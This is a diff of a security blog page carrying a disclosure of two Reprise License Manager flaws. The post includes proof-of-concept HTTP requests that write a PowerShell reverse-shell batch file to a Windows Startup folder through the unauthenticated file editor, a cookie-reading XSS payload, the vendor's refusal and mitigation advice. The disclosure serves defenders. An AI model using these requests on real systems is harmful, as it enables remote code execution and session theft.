@@ -43,17 +43,10 @@ During a recent engagement, I came across a particularly interesting web applica
 <meta itemprop="description" content="CVE-2018–15573: Arbitrary File Write in Reprise License Manager
 CVE-2018–15574: XSS in Reprise License Manager
 TW-2018-006: Unpatched Remote Code Execution and XSS in Reprise License Manager
-During a recent engagement, I came across a particularly interesting web application called RLM, running on the non-standard port 5054. This naturally caught my eye. After a bit of poking around, I was able to identify a critical vulnerability which allowed me to execute code on the server, eventually leading to full domain compromise.">
-
-
-<meta itemprop="datePublished" content="2018-07-18T17:32:04&#43;00:00" />
+During a recent engagement, I came across a particularly interesting web application called RLM, running on the non-standard port 5054. This naturally caught my eye. After a bit of poking around, I was able to identify a critical vulnerability which allowed me to execute code on the server, eventually leading to full domain compromise."><meta itemprop="datePublished" content="2018-07-18T17:32:04&#43;00:00" />
 <meta itemprop="dateModified" content="2018-07-18T17:32:04&#43;00:00" />
-<meta itemprop="wordCount" content="1061">
-
-
-
-<meta itemprop="keywords" content="security research,application security,disclosure,CVE-2018–15573,CVE-2018–15574," />
-<meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="wordCount" content="1061"><meta itemprop="image" content="/"/>
+<meta itemprop="keywords" content="security research,application security,disclosure,CVE-2018–15573,CVE-2018–15574," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="/"/>
 
 <meta name="twitter:title" content="RCE with Arbitrary File Write and XSS in Reprise License Manager (CVE-2018–15573, CVE-2018–15574)"/>
@@ -131,56 +124,33 @@ During a recent engagement, I came across a particularly interesting web applica
             
 
             <div class="post-content">
-                
-
-<p><em><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15573" target="_blank">CVE-2018–15573</a>: Arbitrary File Write in Reprise License Manager</em></p>
-
-<p><em><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15574" target="_blank">CVE-2018–15574</a>: XSS in Reprise License Manager</em></p>
-
-<p><em><a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2018-006/?fid=11474" target="_blank">TW-2018-006</a>: Unpatched Remote Code Execution and XSS in Reprise License Manager</em></p>
-
+                <p><em><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15573">CVE-2018–15573</a>: Arbitrary File Write in Reprise License Manager</em></p>
+<p><em><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15574">CVE-2018–15574</a>: XSS in Reprise License Manager</em></p>
+<p><em><a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2018-006/?fid=11474">TW-2018-006</a>: Unpatched Remote Code Execution and XSS in Reprise License Manager</em></p>
 <p>During a recent engagement, I came across a particularly interesting web application called <code>RLM</code>, running on the non-standard port <code>5054</code>. This naturally caught my eye. After a bit of poking around, I was able to identify a critical vulnerability which allowed me to execute code on the server, eventually leading to full domain compromise.</p>
-
 <p>Regrettably, despite my best efforts, the vendor has refused to issue patches as they do not believe these findings to be vulnerabilities (see vendor response below).</p>
-
 <p>In the interest of responsible disclosure, the details are as follows:</p>
-
-<p><strong>Vendor:</strong> Reprise Software (<a href="http://www.reprisesoftware.com" target="_blank">http://www.reprisesoftware.com</a>)</p>
-
+<p><strong>Vendor:</strong> Reprise Software (<a href="http://www.reprisesoftware.com">http://www.reprisesoftware.com</a>)</p>
 <p><strong>Product:</strong> RLM</p>
-
 <p><strong>Version Affected:</strong> 12.2BL2 and earlier</p>
-
 <p><strong>Description:</strong></p>
-
 <blockquote>
 <p>&ldquo;RLM provides all the features you need and expect from an enterprise-class license manager, yet it is familiar and easy to administer, either on premises or in the cloud.&rdquo;</p>
 </blockquote>
-
 <p>Unfortunately, the RLM web app running on port <code>5054</code> allows attackers to specify an arbitrary license file on the server to read and modify. Exploiting this vulnerability in the web interface provided by <code>rlm.exe</code>, can result in information leakage or remote code execution via upload of malware.</p>
-
 <p>An XSS (reflected) vulnerability also exists in the license editor and is described later in the article.</p>
-
 <h1 id="poc-rce-with-arbitrary-file-write">PoC: RCE with Arbitrary File Write</h1>
-
 <p>Attackers can use the RLM web interface to <em>read and write</em> data to any file on disk as long as <code>rlm.exe</code> has access to it.  By default, RLM&rsquo;s web server running on port <code>5054</code>, does not require authentication.</p>
-
 <p>To achieve remote code execution, this vulnerability can be used to write malware to either:</p>
-
 <ul>
 <li>User AppData Startup folder: <code>%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code></li>
 <li><em>(if rlm.exe is privileged)</em> IIS webroot: <code>%SYSTEMDRIVE%:\inetpub\wwwroot\shell.aspx</code></li>
 <li><em>(if rlm.exe is privileged)</em>  All Users Startup folder: <code>%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\</code></li>
 </ul>
-
 <h2 id="example-rce-via-user-startup-folder">Example RCE via user startup folder</h2>
-
 <p>The following example will write the <code>ConfigureProfile.bat</code> reverse shell to the user startup folder <code>%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code>. This attack does not require administrative access and can be used to execute code if RLM is running as a low-privilege user.</p>
-
-<p>In order to find <code>rlm.exe</code>&rsquo;s user context and a writeable <code>Start Menu Startup</code> folder, we can use the web-based diagnostics tool: <a href="http://TARGET:5054/goforms/diagnostics" target="_blank">http://TARGET:5054/goforms/diagnostics</a></p>
-
+<p>In order to find <code>rlm.exe</code>&rsquo;s user context and a writeable <code>Start Menu Startup</code> folder, we can use the web-based diagnostics tool: http://TARGET:5054/goforms/diagnostics</p>
 <p>A diagnostics text file will be generated in a <em>user-specified</em> location, which can be read using the web-based license editor:</p>
-
 <pre><code>RLM Server Diagnostics
 
     RLM version: 12.2BL2-p1
@@ -193,18 +163,13 @@ During a recent engagement, I came across a particularly interesting web applica
     Working directory: C:\Users\Bob\Documents\Reprise\rlm.v12.2BL2-x64_w3.admin
 [...]
 </code></pre>
-
 <p>The following Empire reverse shell will be written to <code>C:\Users\Bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ConfigureProfile.bat</code>:</p>
-
 <pre><code class="language-powershell">@echo off 
 start /b powershell.exe -noP -sta -w 1 -enc  SQBG...AEUAWAA= 
 exit /b
 </code></pre>
-
 <h3 id="writing-the-malware-to-disk">Writing the malware to disk</h3>
-
 <p>The malware contents are passed via <code>lfdata</code> and the target path is specified by <code>lf</code>:</p>
-
 <pre><code class="language-http">POST /goform/edit_lf_process HTTP/1.1
 Host: TARGET:5054
 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
@@ -225,21 +190,13 @@ Content-Type: text/html
 &lt;html&gt;
 [...]license file C:\Users\Bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ConfigureProfile.bat written.[...]
 </code></pre>
-
 <p><code>ConfigureProfile.bat</code> will execute when the user <code>Bob</code> logs in again. Combining this attack with a denial of service attack could expedite a fresh login or reboot.</p>
-
 <p>If <code>rlm.exe</code> is running with elevated privileges, it may be better to write the shell to <code>%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\</code> instead.</p>
-
 <h1 id="poc-xss-reflected-in-rlm">PoC: XSS (Reflected) in RLM</h1>
-
 <p>A cross-site scripting vulnerability exists in the <code>lf</code> parameter of the <code>/goform/edit_lf_get_data</code> URL in RLM&rsquo;s web interface.</p>
-
 <p>RLM does not enforce <code>POST</code> for this URL and the payload can also be passed with a <code>GET</code> request.</p>
-
 <h2 id="xss-payload-reflected-in-response">XSS payload reflected in response</h2>
-
 <p>The payload is passed via the <code>lf</code> parameter either through <code>POST</code> or <code>GET</code>:</p>
-
 <pre><code class="language-http">GET /goform/edit_lf_get_data?lf=&lt;svg/onload=alert(document.cookie)&gt;&amp;ok=Edit+License+File HTTP/1.1
 Host: TARGET:5054
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -260,43 +217,29 @@ Content-Type: text/html
 &lt;u&gt;License File: &lt;svg/onload=alert(document.cookie)&gt;&lt;/u&gt;
 [...]
 </code></pre>
-
 <h1 id="vendor-response">Vendor Response</h1>
-
 <p>Vendor was contacted but refused accept that this was a security risk or to issue a patch. During our email correspondence the general theme could be wrapped up in the following quotes:</p>
-
 <blockquote>
 <p>&ldquo;We tell end users not to run the rlm server (which implements the web server) in privileged mode. There is no reason it needs to run with elevated privileges.&rdquo;</p>
 </blockquote>
-
 <p>Good. That&rsquo;s good practice. Of course they&rsquo;re aware that users ignore your best practices and typically leave defaults in place, right?</p>
-
 <blockquote>
 <p>&ldquo;The license and options file editors in the web interface are no more dangerous than notepad or wordpad.&rdquo;</p>
 </blockquote>
-
 <p>Um, not quite, unless you give access to Notepad or Wordpad on your system to anyone with access to the RLM port. We attempted to explain the difference between an anonymous remotely accessible file editor and <code>notepad.exe</code>, but the vendor&rsquo;s final response was:</p>
-
 <blockquote>
 <p>&ldquo;We do not consider this a vulnerability, any more than vi or notepad are vulnerabilities. Of course, NO ONE should run the servers as root/administrator; if they do, they deserve what they get. They can, also, disable the web interface, or, if they want to run it, they can enable logins for it. So there are plenty of opportunities for an admin to prevent any file writing.&rdquo;</p>
 </blockquote>
-
 <p>While it&rsquo;s pretty obvious that this support person was not well educated on the potential risk here, the real issue isn&rsquo;t the support staff but an organization that has no approved process to accept third party vulnerability reports. While their response might sound hostile, there was no escalation path for this support person.</p>
-
-<p>The biggest problem we run into during the disclosure process is getting the disclosure in front of the correct audience. Even though these vendors are basically getting a free audit that helps them secure their products for their customers, we are often met with hostility simply because they are unsure how to handle the report. If you don&rsquo;t have the capability to support this process in house there are third party options like <a href="https://www.bugcrowd.com/how-it-works/" target="_blank">Bugcrowd</a> that can get you started and manage the process for you.</p>
-
+<p>The biggest problem we run into during the disclosure process is getting the disclosure in front of the correct audience. Even though these vendors are basically getting a free audit that helps them secure their products for their customers, we are often met with hostility simply because they are unsure how to handle the report. If you don&rsquo;t have the capability to support this process in house there are third party options like <a href="https://www.bugcrowd.com/how-it-works/">Bugcrowd</a> that can get you started and manage the process for you.</p>
 <h1 id="recommendations">Recommendations</h1>
-
 <p>If you must use the web server component:</p>
-
 <ul>
 <li>Do not run RLM with high-privilege</li>
 <li>Limit network access to the RLM web server</li>
 <li>Enable strong authentication for RLM web server</li>
 </ul>
-
 <h1 id="timeline">Timeline</h1>
-
 <ul>
 <li>05/18/2018 - Vulnerability disclosed to vendor</li>
 <li>05/18/2018 - Vendor refuses to patch, insisting these are not vulnerabilities</li>
@@ -325,7 +268,7 @@ Content-Type: text/html
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2020</span>
+            <span>&copy; 2021</span>
             
                 <span><a href="/">Bit Therapy</a></span>
             
@@ -353,7 +296,7 @@ Content-Type: text/html
 
 
 
-<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>
 
 
 
